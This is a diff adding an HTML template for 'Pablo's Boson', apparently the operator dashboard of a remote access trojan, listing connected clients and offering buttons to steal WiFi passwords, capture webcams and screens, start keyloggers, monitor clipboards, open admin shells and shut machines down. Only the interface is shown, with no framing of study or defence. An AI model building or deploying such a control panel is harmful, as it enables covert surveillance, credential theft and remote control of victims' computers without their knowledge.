@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pablo's Boson - Command Center</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark mb-4">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="#">
+                <i class="fas fa-shield-alt me-2"></i>Pablo's Boson
+            </a>
+            <div class="d-flex align-items-center">
+                <span class="text-white user-info me-3">
+                    <i class="fas fa-user-circle me-1"></i>Logged in as: <strong>{{ current_user.id }}</strong>
+                </span>
+                <a href="{{ url_for('logout') }}" class="btn btn-outline-light btn-sm">
+                    <i class="fas fa-sign-out-alt me-1"></i>Logout
+                </a>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Client List and Info -->
+            <div class="col-md-3">
+                <div class="card">
+                    <div class="card-header position-relative">
+                        <i class="fas fa-laptop me-2"></i>Connected Clients
+                        <button class="refresh-btn" onclick="refreshClients()" title="Refresh client list">
+                            <i class="fas fa-sync-alt text-white"></i>
+                        </button>
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="list-group list-group-flush" id="client-list">
+                            <a href="#" class="list-group-item list-group-item-action disabled">
+                                <i class="fas fa-circle-notch fa-spin me-2"></i>Loading clients...
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header bg-info">
+                        <i class="fas fa-info-circle me-2"></i>Client Information
+                    </div>
+                    <div class="card-body">
+                        <div class="client-info" id="client-info">
+                            <div class="text-center py-4">
+                                <i class="fas fa-desktop fa-3x mb-3 text-muted"></i>
+                                <p class="mb-0">Select a client to view details</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Command Panel -->
+            <div class="col-md-9">
+                <div class="card">
+                    <div class="card-header bg-success">
+                        <i class="fas fa-terminal me-2"></i>Command Center
+                    </div>
+                    <div class="card-body">
+                        <!-- Custom Command -->
+                        <div class="input-group mb-4">
+                            <span class="input-group-text bg-light">
+                                <i class="fas fa-chevron-right text-primary"></i>
+                            </span>
+                            <input type="text" class="form-control" id="command-input" placeholder="Enter command...">
+                            <button class="btn btn-primary" type="button" onclick="sendCommand()">
+                                <i class="fas fa-paper-plane me-1"></i>Send
+                            </button>
+                        </div>
+                        
+                        <!-- Quick Commands -->
+                        <h6 class="section-title"><i class="fas fa-bolt"></i>Quick Commands</h6>
+                        <div class="quick-commands-container mb-4">
+                            <button class="btn command-btn" data-command="systeminfo">
+                                <i class="fas fa-info-circle me-2 text-info"></i>System Info
+                            </button>
+                            <button class="btn command-btn" data-command="ipconfig">
+                                <i class="fas fa-wifi me-2 text-info"></i>IP Config
+                            </button>
+                            <button class="btn command-btn" data-command="netstat -ano">
+                                <i class="fas fa-network-wired me-2 text-info"></i>Network Stats
+                            </button>
+                            <button class="btn command-btn" data-command="get_wifi_passwords">
+                                <i class="fas fa-key me-2 text-warning"></i>WiFi Passwords
+                            </button>
+                            <button class="btn command-btn" data-command="capture_webcam">
+                                <i class="fas fa-camera me-2 text-danger"></i>Capture Webcam
+                            </button>
+                            <button class="btn command-btn" data-command="capture_screenshot">
+                                <i class="fas fa-desktop me-2 text-success"></i>Capture Screen
+                            </button>
+                            <button class="btn command-btn" data-command="whoami">
+                                <i class="fas fa-user me-2 text-primary"></i>Current User
+                            </button>
+                            <button class="btn command-btn" data-command="get_owner">
+                                <i class="fas fa-user-shield me-2 text-primary"></i>Owner Info
+                            </button>
+                            <button class="btn command-btn" data-command="dir">
+                                <i class="fas fa-folder-open me-2 text-warning"></i>List Files
+                            </button>
+                            <button class="btn command-btn" data-command="tasklist">
+                                <i class="fas fa-list me-2 text-warning"></i>Task List
+                            </button>
+                            <button class="btn command-btn" data-command="keylog_start">
+                                <i class="fas fa-keyboard me-2 text-success"></i>Start Keylogger
+                            </button>
+                            <button class="btn command-btn" data-command="keylog_stop">
+                                <i class="fas fa-stop-circle me-2 text-danger"></i>Stop Keylogger
+                            </button>
+                            <button class="btn command-btn" data-command="clipboard_start">
+                                <i class="fas fa-clipboard me-2 text-success"></i>Monitor Clipboard
+                            </button>
+                            <button class="btn command-btn" data-command="clipboard_stop">
+                                <i class="fas fa-clipboard-check me-2 text-danger"></i>Stop Clipboard
+                            </button>
+                            <button class="btn command-btn" data-command="clipboard_get">
+                                <i class="fas fa-paste me-2 text-info"></i>Get Clipboard
+                            </button>
+                            <button class="btn command-btn" data-command="open_cmd">
+                                <i class="fas fa-terminal me-2 text-dark"></i>Open CMD
+                            </button>
+                            <button class="btn command-btn" data-command="open_cmd_admin">
+                                <i class="fas fa-user-shield me-2 text-danger"></i>CMD (Admin)
+                            </button>
+                            <button class="btn command-btn" data-command="open_calculator">
+                                <i class="fas fa-calculator me-2 text-success"></i>Calculator
+                            </button>
+                            <button class="btn command-btn" data-command="open_notepad">
+                                <i class="fas fa-edit me-2 text-primary"></i>Notepad
+                            </button>
+                            <button class="btn command-btn" data-command="shutdown">
+                                <i class="fas fa-power-off me-2 text-danger"></i>Shutdown
+                            </button>
+                        </div>
+                        
+                        <!-- Response Log -->
+                        <h6 class="section-title"><i class="fas fa-terminal"></i>Response Terminal</h6>
+                        <div class="response-log" id="response-log">
+                            <div class="log-entry log-command">
+                                <span class="timestamp">[System]</span> <strong>System:</strong> Terminal initialized. Waiting for client responses...
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="dashboard-footer">
+            <p>Pablo's Boson Client Management System &copy; 2024</p>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+</body>
+</html>
